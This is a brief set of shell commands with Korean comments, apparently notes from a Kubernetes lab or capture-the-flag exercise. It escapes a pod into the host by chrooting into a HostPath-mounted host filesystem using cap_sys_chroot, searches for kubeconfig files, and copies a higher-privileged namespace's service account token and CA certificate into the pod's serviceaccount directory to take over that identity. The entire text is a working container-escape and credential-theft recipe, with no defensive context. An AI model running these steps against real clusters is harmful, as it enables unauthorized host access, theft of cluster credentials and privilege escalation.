# cap_sys_chroot와 HostPath를 이용하여 호스트 시스템 접근

# kubeconfig 파일 찾기
find . -name '*kubeconfig*'

# 호스트 시스템 접근
apt install libcap2-bin
chroot /host-system/ /bin/bash

# 호스트 파일 시스템에서 pod 정보 활용하여 
find . -name 'namespace'

# 위 명령어 결과 활용하여 권한이 높은 namespace의 token ca 활용
cp ca.crt token namespace /var/run/secrets/kubernetes.io/serviceaccount/

